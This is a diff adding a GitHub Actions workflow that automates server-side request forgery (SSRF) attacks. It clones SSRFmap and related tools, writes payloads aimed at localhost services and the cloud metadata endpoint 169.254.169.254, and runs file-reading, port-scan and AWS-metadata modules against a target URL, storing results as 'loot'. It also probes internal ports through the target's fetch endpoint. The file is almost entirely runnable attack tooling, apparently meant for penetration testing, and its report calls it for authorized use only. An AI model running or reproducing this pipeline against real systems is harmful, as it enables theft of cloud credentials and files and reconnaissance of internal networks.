@@ -1,0 +1,266 @@
+name: SSRF Assessment
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_url:
+        description: "Target URL to test"
+        required: false
+        type: string
+      target_domain:
+        description: "Target domain for reconnaissance"
+        required: false
+        type: string
+      internal_ports:
+        description: "Comma-separated internal ports to test"
+        required: false
+        type: string
+
+jobs:
+  ssrf-assessment:
+    name: SSRF Security Assessment
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+
+    permissions:
+      contents: read
+      issues: write
+
+    env:
+      TARGET_DOMAIN: ${{ secrets.TARGET_DOMAIN || github.event.inputs.target_domain || 'example.com' }}
+      TARGET_URL: ${{ secrets.TARGET_URL || github.event.inputs.target_url || 'https://example.com/api' }}
+      INTERNAL_PORTS: ${{ secrets.INTERNAL_PORTS || github.event.inputs.internal_ports || '8545,8546,26657,9090,1317' }}
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      - name: Install OS dependencies
+        shell: bash
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y --no-install-recommends \
+            curl wget jq figlet build-essential cmake python3-pip
+          
+          wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
+          sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
+          rm -f go1.21.0.linux-amd64.tar.gz
+          echo "/usr/local/go/bin" >> "$GITHUB_PATH"
+
+      - name: Install Python tools
+        shell: bash
+        run: |
+          python3 -m pip install --no-cache-dir uv
+          python3 -m pip install --no-cache-dir requests regex Flask
+
+      - name: Install Go tools
+        shell: bash
+        run: |
+          go install github.com/tomnomnom/waybackurls@latest
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install github.com/tomnomnom/gf@latest
+          echo "$(go env GOPATH)/bin" >> "$GITHUB_PATH"
+
+      - name: Create workspace
+        shell: bash
+        run: |
+          mkdir -p tools loot reports payloads
+
+      - name: Clone SSRFmap
+        shell: bash
+        run: |
+          git clone --depth 1 https://github.com/swisskyrepo/SSRFmap.git tools/SSRFmap
+          cd tools/SSRFmap
+          uv sync --frozen
+
+      - name: Clone SSRFPwned
+        shell: bash
+        run: |
+          git clone --depth 1 https://github.com/blackhatethicalhacking/SSRFPwned.git tools/SSRFPwned
+
+      - name: Clone ssrf-exploit
+        shell: bash
+        run: |
+          git clone --depth 1 https://github.com/errorfiathck/ssrf-exploit.git tools/ssrf-exploit
+          cat > tools/ssrf-exploit/requirements.txt <<'EOF'
+          requests>=2.28.0
+          regex>=2023.0.0
+          Flask>=2.3.0
+          EOF
+          cd tools/ssrf-exploit
+          python3 -m pip install --no-cache-dir -r requirements.txt
+
+      - name: Create payload files
+        shell: bash
+        run: |
+          cat > payloads/ssrf-payloads.txt <<'PAYLOADS'
+          http://127.0.0.1:8545/
+          http://localhost:8545/
+          http://0.0.0.0:8545/
+          http://127.0.0.1:26657/
+          http://localhost:26657/
+          http://169.254.169.254/latest/meta-data/
+          http://169.254.169.254/latest/user-data/
+          http://127.0.0.1:9090/
+          http://127.0.0.1:1317/
+          PAYLOADS
+
+          TARGET_HOST=$(echo "$TARGET_URL" | sed -E 's#https?://##; s#/.*##')
+          cat > payloads/request.txt <<EOF
+          POST /api/fetch HTTP/1.1
+          Host: $TARGET_HOST
+          User-Agent: Mozilla/5.0 (Security Assessment)
+          Content-Type: application/x-www-form-urlencoded
+          Connection: close
+
+          url=$TARGET_URL
+          EOF
+
+      - name: Phase 1 - SSRFmap
+        continue-on-error: true
+        shell: bash
+        run: |
+          echo "Running SSRFmap..."
+          cd tools/SSRFmap
+          uv run python ssrfmap.py \
+            -r ../../payloads/request.txt \
+            -p url \
+            -m "readfiles,portscan,aws" \
+            --level 1 \
+            -v \
+            --logfile ../../reports/phase1-ssrfmap.log 2>&1 || true
+
+          if [ -d "loot" ]; then
+            mkdir -p ../../loot/ssrfmap_results
+            cp -r loot/* ../../loot/ssrfmap_results/ 2>/dev/null || true
+          fi
+
+      - name: Phase 2 - SSRFPwned
+        continue-on-error: true
+        shell: bash
+        env:
+          TARGET_DOMAIN: ${{ env.TARGET_DOMAIN }}
+        run: |
+          echo "Running SSRFPwned discovery..."
+          cd tools/SSRFPwned
+
+          cat > discover.sh <<'SCRIPT'
+          #!/bin/bash
+          set -e
+          domain="${1:-example.com}"
+          output_dir="results-$domain-$(date +%s)"
+          mkdir -p "$output_dir"
+
+          echo "[*] Fetching Wayback URLs..."
+          if waybackurls "$domain" > "$output_dir/wayback.txt" 2>/dev/null; then
+            echo "Wayback done"
+          else
+            echo "" > "$output_dir/wayback.txt"
+          fi
+
+          echo "[*] Fetching AlienVault passive DNS..."
+          if curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" 2>/dev/null | \
+             jq -r '.passive_dns[].hostname' 2>/dev/null | sed 's/\*\.//g' | sort -u > "$output_dir/alienvault.txt"; then
+            echo "AlienVault done"
+          else
+            echo "" > "$output_dir/alienvault.txt"
+          fi
+
+          cat "$output_dir/wayback.txt" "$output_dir/alienvault.txt" 2>/dev/null | \
+            grep -E -v '\.(png|jpg|jpeg|gif|pdf|css|js|svg)$' | \
+            sort -u > "$output_dir/filtered.txt" || echo "" > "$output_dir/filtered.txt"
+
+          cp "$output_dir/filtered.txt" "../../loot/phase2-ssrfpwned-urls.txt"
+          SCRIPT
+
+          chmod +x discover.sh
+          if [ -n "$TARGET_DOMAIN" ]; then
+            ./discover.sh "$TARGET_DOMAIN" || echo "SSRFPwned completed with warnings"
+          else
+            echo "TARGET_DOMAIN not set, skipping SSRFPwned"
+            touch ../../loot/phase2-ssrfpwned-urls.txt
+          fi
+
+      - name: Phase 3 - ssrf-exploit
+        continue-on-error: true
+        shell: bash
+        run: |
+          echo "Running ssrf-exploit diagnostics..."
+          cd tools/ssrf-exploit
+          python3 ssrf-exploit --help > ../../reports/phase3-ssrf-exploit.txt 2>&1 || true
+          echo "ssrf-exploit workflow completed" >> ../../reports/phase3-ssrf-exploit.txt
+
+      - name: Phase 4 - Internal port scan
+        continue-on-error: true
+        shell: bash
+        run: |
+          if [ -z "$INTERNAL_PORTS" ] || [ -z "$TARGET_URL" ]; then
+            echo "No INTERNAL_PORTS or TARGET_URL configured, skipping port scan."
+            exit 0
+          fi
+
+          echo "Testing internal ports..." > reports/phase4-port-scan.txt
+          IFS=',' read -r -a port_list <<< "$INTERNAL_PORTS"
+
+          for port in "${port_list[@]}"; do
+            port=$(echo "$port" | xargs)
+            [ -z "$port" ] && continue
+
+            http_code=$(curl -sS -X POST "$TARGET_URL" \
+              -H "Content-Type: application/json" \
+              -d "{\"url\":\"http://127.0.0.1:$port\"}" \
+              -w "%{http_code}" \
+              -o /dev/null \
+              --max-time 10 --connect-timeout 5 2>/dev/null || echo "000")
+
+            echo "Port $port -> HTTP $http_code" | tee -a reports/phase4-port-scan.txt
+          done
+
+      - name: Generate final report
+        if: always()
+        shell: bash
+        run: |
+          cat > reports/final-report.md <<REPORT
+          # SSRF Security Assessment Report
+
+          Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")
+
+          ## Configuration
+          - Target Domain: ${TARGET_DOMAIN:-Not set}
+          - Target URL: ${TARGET_URL:-Not set}
+          - Internal Ports: ${INTERNAL_PORTS:-Not set}
+
+          ## Artifacts
+          - SSRFmap: reports/phase1-ssrfmap.log
+          - SSRFPwned: loot/phase2-ssrfpwned-urls.txt
+          - ssrf-exploit: reports/phase3-ssrf-exploit.txt
+          - Port scan: reports/phase4-port-scan.txt
+
+          ## Security note
+          This workflow is intended for authorized security testing only.
+          REPORT
+
+          echo "Final report created."
+
+      - name: Upload artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ssrf-assessment-results
+          path: |
+            reports/
+            loot/
+            payloads/
+          retention-days: 30
+
+      - name: Show summary
+        if: always()
+        shell: bash
+        run: |
+          echo "SSRF assessment completed."
+          cat reports/final-report.md || true
